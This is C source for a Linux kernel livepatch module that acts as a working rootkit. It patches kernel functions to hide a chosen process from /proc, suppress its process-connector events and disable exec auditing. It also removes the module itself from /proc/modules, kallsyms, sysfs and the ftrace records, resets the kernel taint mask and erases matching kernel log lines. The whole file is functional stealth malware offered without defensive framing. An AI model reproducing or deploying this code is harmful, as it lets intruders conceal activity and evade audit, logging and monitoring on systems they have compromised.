/*
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/livepatch.h>
#include <linux/seq_file.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/ptrace.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>
#include <linux/refcount.h>
#include <linux/spinlock.h>
#include <linux/atomic.h>
#include <linux/binfmts.h>
#include <linux/sched/coredump.h>
#include <linux/sched/task.h>
#include <linux/bsearch.h>
#include <linux/cn_proc.h>
#include <linux/connector.h>
#include <linux/dynamic_debug.h>
#include <linux/audit.h>
#include <linux/string.h>


#define FIRST_PROCESS_ENTRY 256
#define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)

typedef struct dentry *instantiate_t(struct dentry *,
                                     struct task_struct *, const void *);
struct tgid_iter {
        unsigned int tgid;
        struct task_struct *task;
};

struct klp_ops {
        struct list_head node;
        struct list_head func_stack;
        struct ftrace_ops fops;
};

struct ftrace_func_entry {
        struct hlist_node hlist;
        unsigned long ip;
};

struct ftrace_hash {
        unsigned long           size_bits;
        struct hlist_head       *buckets;
        unsigned long           count;
        unsigned long           flags;
        struct rcu_head         rcu;
};

struct ftrace_page {
        struct ftrace_page      *next;
        struct dyn_ftrace       *records;
        int                     index;
        int                     size;
};

struct printk_log {
        u64 ts_nsec;            /* timestamp in nanoseconds */
        u16 len;                /* length of entire record */
        u16 text_len;           /* length of text buffer */
        u16 dict_len;           /* length of dictionary buffer */
        u8 facility;            /* syslog facility */
        u8 flags:5;             /* internal record flags */
        u8 level:3;             /* syslog level */
#ifdef CONFIG_PRINTK_CALLER
        u32 caller_id;            /* thread id or processor id */
#endif
};

struct module *this_module = THIS_MODULE;
static int hidden_base_exe = 0;
module_param(hidden_base_exe, int, 0644);

static char hidden_proc_name[] = "hidden_comm";
module_param_string(hidden_proc_name, hidden_proc_name, PATH_MAX, 0644);
static char exe_buf[PATH_MAX] = {0};


static char hidden_msg_klog[] = "hidden_proc";
static char **p_log_buf = NULL;
static raw_spinlock_t *p_logbuf_lock = NULL;
static u64 *p_clear_seq = NULL;
static u32 *p_clear_idx = NULL;
static u64 *p_log_next_seq = NULL;
static u32 *p_log_next_idx = NULL;
static void (*p__printk_safe_enter)(void) = NULL;
static void (*p__printk_safe_exit)(void) = NULL;

static struct tgid_iter (*p_next_tgid)(struct pid_namespace *ns, struct tgid_iter iter) = NULL;
static bool (*p_ptrace_may_access)(struct task_struct *task, unsigned int mode) = NULL;
static bool (*p_proc_fill_cache)(struct file *file, struct dir_context *ctx,
		const char *name, unsigned int len,
		instantiate_t instantiate, struct task_struct *task, const void *ptr) = NULL;

static struct dentry * (*p_proc_pid_instantiate)(struct dentry * dentry,
                                   struct task_struct *task, const void *ptr) = NULL;

//static void (*p___audit_bprm)(struct linux_binprm *bprm) = NULL;

static struct list_head *p_modules = NULL;
static char * (*p_module_flags)(struct module *mod, char *buf) = NULL;
static bool (*p_kallsyms_show_value)(const struct cred *cred) = NULL;

static int (*p_ddebug_remove_module)(const char *mod_name) = NULL;

static const struct kernel_symbol *p__start___ksymtab = NULL;
static const struct kernel_symbol *p__stop___ksymtab = NULL;


static unsigned long old_tainted_mask = 0;
static unsigned long *p_tainted_mask = NULL;

//static struct ftrace_ops __rcu **p_ftrace_ops_list = NULL;
//static struct ftrace_ops *p_ftrace_list_end = NULL;
//static struct mutex *p_ftrace_lock = NULL;
static struct klp_ops * (*p_klp_find_ops)(void *old_func) = NULL;
static struct ftrace_func_entry *(*p_ftrace_lookup_ip)(struct ftrace_hash *hash, unsigned long ip) = NULL;
static struct ftrace_page       **p_ftrace_pages_start = NULL;

static bool has_pid_permissions(struct pid_namespace *pid,
                                 struct task_struct *task,
                                 int hide_pid_min)
{
        if (pid->hide_pid < hide_pid_min)
                return true;
        if (in_group_p(pid->pid_gid))
                return true;
        return p_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);
}

static int get_task_exe(char *buf, int buflen, struct task_struct *task)
{
        int ret = -1;
        struct file *exe_file = NULL;
        char *p = NULL;

        exe_file = get_task_exe_file(task);
        if (exe_file) {
                p = d_path(&(exe_file->f_path), buf, buflen - 1);
                fput(exe_file);

                if (IS_ERR_OR_NULL(p)) {
                        ret = -1;
                } else {
                        ret = strlen(p);
                        memmove(buf, p, ret);
                        buf[ret] = '\0';
                }
        }

        return ret;
}

static int livepatch_proc_pid_readdir(struct file *file, struct dir_context *ctx)
{
        struct tgid_iter iter;
        struct pid_namespace *ns = proc_pid_ns(file_inode(file));
        loff_t pos = ctx->pos;

        if (pos >= PID_MAX_LIMIT + TGID_OFFSET)
                return 0;

        if (pos == TGID_OFFSET - 2) {
                struct inode *inode = d_inode(ns->proc_self);
                if (!dir_emit(ctx, "self", 4, inode->i_ino, DT_LNK))
                        return 0;
                ctx->pos = pos = pos + 1;
        }
        if (pos == TGID_OFFSET - 1) {
                struct inode *inode = d_inode(ns->proc_thread_self);
                if (!dir_emit(ctx, "thread-self", 11, inode->i_ino, DT_LNK))
                        return 0;
                ctx->pos = pos = pos + 1;
        }

        iter.tgid = pos - TGID_OFFSET;
        iter.task = NULL;
        for (iter = p_next_tgid(ns, iter);
             iter.task;
             iter.tgid += 1, iter = p_next_tgid(ns, iter)) {
                char name[10 + 1];
                unsigned int len;

                cond_resched();
                if (!has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))
                        continue;

		if (hidden_base_exe) {
			if (get_task_exe(exe_buf, sizeof(exe_buf), iter.task) > 0) {
				if (strncmp(exe_buf, hidden_proc_name, sizeof(exe_buf)) == 0)
					continue;
			}
		} else {
			if (strncmp(iter.task->comm, hidden_proc_name, sizeof(iter.task->comm)) == 0)
				continue;
		}

                len = snprintf(name, sizeof(name), "%u", iter.tgid);
                ctx->pos = iter.tgid + TGID_OFFSET;
                if (!p_proc_fill_cache(file, ctx, name, len,
                                     p_proc_pid_instantiate, iter.task, NULL)) {
                        put_task_struct(iter.task);
                        return 0;
                }
        }
        ctx->pos = PID_MAX_LIMIT + TGID_OFFSET;
        return 0;
}

/*
 * hidden the kernel module from /proc/modules
 */
static void *m_start(struct seq_file *m, loff_t *pos)
{
        mutex_lock(&module_mutex);
        return seq_list_start(p_modules, *pos);
}

static void *m_next(struct seq_file *m, void *p, loff_t *pos)
{
        return seq_list_next(p, p_modules, pos);
}

static void m_stop(struct seq_file *m, void *p)
{
        mutex_unlock(&module_mutex);
}

static inline void print_unload_info(struct seq_file *m, struct module *mod)
{
        struct module_use *use;
        int printed_something = 0;

        seq_printf(m, " %i ", module_refcount(mod)); 

        /*
         * Always include a trailing , so userspace can differentiate
         * between this and the old multi-field proc format.
         */
        list_for_each_entry(use, &mod->source_list, source_list) {
                printed_something = 1;
                seq_printf(m, "%s,", use->source->name);
        }

        if (mod->init != NULL && mod->exit == NULL) {
                printed_something = 1;
                seq_puts(m, "[permanent],");
        }

        if (!printed_something)
                seq_puts(m, "-");
}

#define MODULE_FLAGS_BUF_SIZE (TAINT_FLAGS_COUNT + 4)
static int m_show(struct seq_file *m, void *p)
{
        struct module *mod = list_entry(p, struct module, list);
        char buf[MODULE_FLAGS_BUF_SIZE];
        void *value;

        /* We always ignore unformed modules. */
        if (mod->state == MODULE_STATE_UNFORMED)
                return 0;

	if (mod == this_module)
		return 0;

        seq_printf(m, "%s %u",
                   mod->name, mod->init_layout.size + mod->core_layout.size);
        print_unload_info(m, mod);

        /* Informative for users. */
        seq_printf(m, " %s",
                   mod->state == MODULE_STATE_GOING ? "Unloading" :
                   mod->state == MODULE_STATE_COMING ? "Loading" :
                   "Live");
        /* Used by oprofile and other similar tools. */
        value = m->private ? NULL : mod->core_layout.base;
        seq_printf(m, " 0x%px", value);

        /* Taints info */
        if (mod->taints)
                seq_printf(m, " %s", p_module_flags(mod, buf));
                
        seq_puts(m, "\n");
        return 0;
}

static const struct seq_operations modules_op = {
        .start  = m_start,
        .next   = m_next,
        .stop   = m_stop,
        .show   = m_show
};

static int livepatch_modules_open(struct inode *inode, struct file *file)
{
        int err = seq_open(file, &modules_op);

        if (!err) {
                struct seq_file *m = file->private_data;
                m->private = p_kallsyms_show_value(file->f_cred) ? NULL : (void *)8ul;
        }

        return err;
}

/*
 * hidden the kernel module from /proc/modules
 */

static unsigned long kernel_symbol_value(const struct kernel_symbol *sym)
{
#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
        return (unsigned long)offset_to_ptr(&sym->value_offset);
#else
        return sym->value;
#endif
}

static const char *kallsyms_symbol_name(struct mod_kallsyms *kallsyms, unsigned int symnum)
{
        return kallsyms->strtab + kallsyms->symtab[symnum].st_name;
}

static const char *kernel_symbol_name(const struct kernel_symbol *sym)
{
#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
        return offset_to_ptr(&sym->name_offset);
#else
        return sym->name;
#endif
}

static int cmp_name(const void *name, const void *sym)
{
        return strcmp(name, kernel_symbol_name(sym));
}

static const struct kernel_symbol *lookup_exported_symbol(const char *name,
                                                          const struct kernel_symbol *start,
                                                          const struct kernel_symbol *stop)
{
        return bsearch(name, start, stop - start,
                        sizeof(struct kernel_symbol), cmp_name);
}

static int is_exported(const char *name, unsigned long value,
                       const struct module *mod)
{
        const struct kernel_symbol *ks;
        if (!mod)
                ks = lookup_exported_symbol(name, p__start___ksymtab, p__stop___ksymtab);
        else
                ks = lookup_exported_symbol(name, mod->syms, mod->syms + mod->num_syms);

        return ks != NULL && kernel_symbol_value(ks) == value;
}

static int livepatch_module_get_kallsym(unsigned int symnum, unsigned long *value, char *type,
                        char *name, char *module_name, int *exported)
{
        struct module *mod;

        preempt_disable();
        list_for_each_entry_rcu(mod, p_modules, list) {
                struct mod_kallsyms *kallsyms;

		if (mod == this_module)
                        continue;

                if (mod->state == MODULE_STATE_UNFORMED)
                        continue;

                kallsyms = rcu_dereference_sched(mod->kallsyms);
                if (symnum < kallsyms->num_symtab) {
                        const Elf_Sym *sym = &kallsyms->symtab[symnum];

                        *value = kallsyms_symbol_value(sym);
                        *type = kallsyms->typetab[symnum];
                        strlcpy(name, kallsyms_symbol_name(kallsyms, symnum), KSYM_NAME_LEN);
                        strlcpy(module_name, mod->name, MODULE_NAME_LEN);
                        *exported = is_exported(name, *value, mod);
                        preempt_enable();
                        return 0;
                }
                symnum -= kallsyms->num_symtab;
        }
        preempt_enable();
        return -ERANGE;
}

/*
 * bypass the cn_proc about the hidden proc msg
 */
static int livepatch_cn_netlink_send(struct cn_msg *msg, u32 portid, u32 __group,
        gfp_t gfp_mask)
{
	struct task_struct *task = current;
	if (hidden_base_exe) {
		if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
			if (strncmp(exe_buf, hidden_proc_name, sizeof(exe_buf)) == 0)
				return 0;
		}
	} else {
		if (strncmp(task->comm, hidden_proc_name, sizeof(task->comm)) == 0)
				return 0;
	}

	return cn_netlink_send_mult(msg, msg->len, portid, __group, gfp_mask);
}

static void livepatch__audit_bprm(struct linux_binprm *bprm)
{
	return;
}

static void hidden_module(struct module *mod) {
	//del from 'modules' list
	list_del(&mod->list);

	//del from /sys/module/
	if (mod->holders_dir && mod->holders_dir->parent) {                 
		kobject_del(mod->holders_dir->parent);                           
	}     

	p_ddebug_remove_module(mod->name);
}

static void hidden_from_sys_livepatch(struct klp_patch *klp) 
{
	if (!klp)
		goto end;

	kobject_del(&klp->kobj);
	list_del(&klp->list);
end:
	return;
}

static void save_tainted_mask(void)
{
	old_tainted_mask = *p_tainted_mask;
}

static void restore_tainted_mask(void)
{
	*p_tainted_mask = old_tainted_mask; 
	old_tainted_mask = 0;
}

#if 0
static int remove_ftrace_ops(struct ftrace_ops *ops)
{
        struct ftrace_ops **p;

        /*
         * If we are removing the last function, then simply point
         * to the ftrace_stub.
         */
        if (rcu_dereference_protected(*p_ftrace_ops_list,
                        lockdep_is_held(p_ftrace_lock)) == ops &&
            rcu_dereference_protected(ops->next,
                        lockdep_is_held(p_ftrace_lock)) == p_ftrace_list_end) {
                *p_ftrace_ops_list = p_ftrace_list_end;
                return 0;
        }

        for (p = p_ftrace_ops_list; *p != p_ftrace_list_end; p = &(*p)->next)
                if (*p == ops)
                        break;

        if (*p != ops)
                return -1;

        *p = (*p)->next;
        return 0;
}
#endif

#define do_for_each_ftrace_rec(pg, rec)                                 \
        for (pg = *p_ftrace_pages_start; pg; pg = pg->next) {              \
                int _____i;                                             \
                for (_____i = 0; _____i < pg->index; _____i++) {        \
                        rec = &pg->records[_____i];

#define while_for_each_ftrace_rec()             \
                }                               \
        }

static void hidden_from_enabled_functions(struct klp_object *obj )
{
	struct klp_func *func = NULL;
	struct klp_ops *ops = NULL;
	struct ftrace_ops *fops = NULL;
	struct ftrace_hash *hash = NULL;
	unsigned long ftrace_loc;
	//struct ftrace_func_entry *entry = NULL;
	struct ftrace_page *pg = NULL;
	struct dyn_ftrace *rec = NULL;

	klp_for_each_func(obj, func) {
		ops = p_klp_find_ops(func->old_func);
		if (!ops)  
			continue;

		fops = &ops->fops;

		ftrace_loc = (unsigned long)func->old_func;
		if (!ftrace_loc) 
			continue;

		hash = fops->func_hash->filter_hash ;
		do_for_each_ftrace_rec(pg, rec) {
			if (p_ftrace_lookup_ip(hash, rec->ip)) {
				rec->flags &= ~FTRACE_FL_ENABLED;
				rec->flags &= FTRACE_FL_MASK;
			}
		} while_for_each_ftrace_rec();

#if 0
		entry = p_ftrace_lookup_ip(hash, ftrace_loc);
		if (entry) {
			hlist_del(&entry->hlist);
			hash->count--;
		}

		remove_ftrace_ops(fops);
		fops->flags &= ~FTRACE_OPS_FL_ENABLED;
#endif
        }
}

static struct printk_log *log_from_idx(u32 idx)
{
        struct printk_log *msg = (struct printk_log *)(*p_log_buf + idx);

        /*
         * A length == 0 record is the end of buffer marker. Wrap around and
         * read the message at the start of the buffer.
         */
        if (!msg->len) 
                return (struct printk_log *)(*p_log_buf);
        return msg; 
}

static u32 log_next(u32 idx)
{
        struct printk_log *msg = (struct printk_log *)(*p_log_buf + idx);

        /* length == 0 indicates the end of the buffer; wrap */
        /*
         * A length == 0 record is the end of buffer marker. Wrap around and
         * read the message at the start of the buffer as *this* one, and
         * return the one after that.
         */ 
        if (!msg->len) {
                msg = (struct printk_log *)(*p_log_buf);
                return msg->len;
        }
        return idx + msg->len;
}

static char *log_text(const struct printk_log *msg) 
{
        return (char *)msg + sizeof(struct printk_log);
}

#define printk_safe_enter_irq()         \
        do {                                    \
                local_irq_disable();            \
                p__printk_safe_enter();          \
        } while (0)

#define printk_safe_exit_irq()                  \
        do {                                    \
                p__printk_safe_exit();           \
                local_irq_enable();             \
        } while (0)

#define logbuf_lock_irq()                               \
        do {                                            \
                printk_safe_enter_irq();                \
                raw_spin_lock(p_logbuf_lock);            \
        } while (0)

#define logbuf_unlock_irq()                             \
        do {                                            \
                raw_spin_unlock(p_logbuf_lock);          \
                printk_safe_exit_irq();                 \
        } while (0)


static void clear_klog(void)
{
	u64 seq;
	u32 idx;

	u64 sum_seq = 0;
	u32 sum_idx = 0;
	//int flag = 0;

	logbuf_lock_irq();      
	seq = *p_clear_seq;
	idx = *p_clear_idx;
	while (seq < *p_log_next_seq) {
		struct printk_log *msg = log_from_idx(idx);
		char *text = log_text(msg);

		idx = log_next(idx);
		seq++;

		//if (flag == 0) {
			if (msg->text_len >= sizeof(hidden_msg_klog)) {
				if (strstr(text, hidden_msg_klog)) { 
					//flag = 1;
					//sum_seq++;
					//sum_idx += msg->len;
					msg->text_len = 0;
					msg->dict_len = 0;
					msg->len = 0;
				}
			}
		#if 0
		} else {
			sum_seq++;
			sum_idx += msg->len;
		}
		#endif
	}

#if 0
	if (*p_log_next_seq > sum_seq)
		*p_log_next_seq -= sum_seq;
	if (*p_log_next_idx > sum_idx)
		*p_log_next_idx -= sum_idx;
#endif

	logbuf_unlock_irq();      
}

static struct klp_func funcs[] = {
	{
		.old_name = "proc_pid_readdir",
		.new_func = livepatch_proc_pid_readdir,
	}, 
	{
		.old_name = "cn_netlink_send",
		.new_func = livepatch_cn_netlink_send,
	}, 
	{
		.old_name = "__audit_bprm",
		.new_func = livepatch__audit_bprm,
	}, 
	{
		.old_name = "modules_open",
		.new_func = livepatch_modules_open,
	}, 
	{
		.old_name = "module_get_kallsym",
		.new_func = livepatch_module_get_kallsym,
	}, { }
};

static struct klp_object objs[] = {
	{
		/* name being NULL means vmlinux */
		.funcs = funcs,
	}, { }
};

static struct klp_patch patch = {
	.mod = THIS_MODULE,
	.objs = objs,
};

static int livepatch_init(void)
{
	int ret = -1;

	p_next_tgid = (struct tgid_iter (*)(struct pid_namespace *ns, struct tgid_iter iter)) 
				kallsyms_lookup_name("next_tgid");
	if (!p_next_tgid)
		return -1;

	p_ptrace_may_access = (bool (*)(struct task_struct *task, unsigned int mode)) 
				kallsyms_lookup_name("ptrace_may_access");
	if (!p_ptrace_may_access)
		return -1;

	p_proc_fill_cache = (bool (*)(struct file *file, struct dir_context *ctx,
				const char *name, unsigned int len,
				instantiate_t instantiate, struct task_struct *task, const void *ptr))
				kallsyms_lookup_name("proc_fill_cache");
	if (!p_proc_fill_cache)
		return -1;

	p_proc_pid_instantiate = (struct dentry *(*)(struct dentry * dentry,
                                   struct task_struct *task, const void *ptr))
				kallsyms_lookup_name("proc_pid_instantiate");
	if (!p_proc_pid_instantiate)
		return -1;

	p_modules = (struct list_head *)
				kallsyms_lookup_name("modules");
	if (!p_modules)
		return -1;

	p_module_flags = (char *(*)(struct module *mod, char *buf))
				kallsyms_lookup_name("module_flags");
	if (!p_module_flags)
		return -1;

	p_kallsyms_show_value = (bool (*)(const struct cred *cred))
				kallsyms_lookup_name("kallsyms_show_value");
	if (!p_kallsyms_show_value)
		return -1;

	p__start___ksymtab = (struct kernel_symbol*)
				kallsyms_lookup_name("__start___ksymtab");
	if (!p__start___ksymtab)
		return -1;

	p__stop___ksymtab = (struct kernel_symbol*)
				kallsyms_lookup_name("__stop___ksymtab");
	if (!p__stop___ksymtab)
		return -1;

	p_ddebug_remove_module = (int (*)(const char *mod_name))
				kallsyms_lookup_name("ddebug_remove_module");
	if (!p_ddebug_remove_module)
		return -1;

	p_tainted_mask = (unsigned long*)
				kallsyms_lookup_name("tainted_mask");
	if (!p_tainted_mask)
		return -1;

#if 0
	p_ftrace_lock = (struct mutex *) kallsyms_lookup_name("ftrace_lock");
	if (!p_ftrace_lock)
		return -1;

	p_ftrace_ops_list = (struct ftrace_ops **) kallsyms_lookup_name("ftrace_ops_list");
	if (!p_ftrace_ops_list)
		return -1;

	p_ftrace_list_end = (struct ftrace_ops *) kallsyms_lookup_name("ftrace_list_end");
	if (!p_ftrace_list_end)
		return -1;
#endif

	p_klp_find_ops = (struct klp_ops *(*)(void *old_func)) kallsyms_lookup_name("klp_find_ops");
	if (!p_klp_find_ops)
		return -1;

	p_ftrace_lookup_ip = (struct ftrace_func_entry *(*)(struct ftrace_hash *hash, unsigned long ip))
				 kallsyms_lookup_name("ftrace_lookup_ip");
	if (!p_ftrace_lookup_ip)
		return -1;

	p_ftrace_pages_start = (struct ftrace_page **)
				 kallsyms_lookup_name("ftrace_pages_start");
	if (!p_ftrace_pages_start)
		return -1;

	p_log_buf = (char **) kallsyms_lookup_name("log_buf");
	if (!p_log_buf)
		return -1;

	p_logbuf_lock = (raw_spinlock_t *) kallsyms_lookup_name("logbuf_lock");
	if (!p_logbuf_lock)
		return -1;

	p_clear_seq = (u64*) kallsyms_lookup_name("clear_seq");
	if (!p_clear_seq)
		return -1;

	p_clear_idx = (u32*) kallsyms_lookup_name("clear_idx");
	if (!p_clear_idx)
		return -1;

	p_log_next_seq = (u64*) kallsyms_lookup_name("log_next_seq");
	if (!p_log_next_seq)
		return -1;

	p_log_next_idx = (u32*) kallsyms_lookup_name("log_next_idx");
	if (!p_log_next_idx)
		return -1;

	p__printk_safe_enter = (void(*)(void)) kallsyms_lookup_name("__printk_safe_enter");
	if (!p__printk_safe_enter)
		return -1;

	p__printk_safe_exit = (void(*)(void)) kallsyms_lookup_name("__printk_safe_exit");
	if (!p__printk_safe_exit)
		return -1;

	save_tainted_mask();
	ret = klp_enable_patch(&patch);
	if (ret == 0) { 
		hidden_module(this_module);
		hidden_from_sys_livepatch(&patch);
		hidden_from_enabled_functions(objs);
	}
	restore_tainted_mask();

	clear_klog();

	return ret;
}

static void livepatch_exit(void)
{
}

module_init(livepatch_init);
module_exit(livepatch_exit);
MODULE_LICENSE("GPL");
MODULE_INFO(livepatch, "Y");
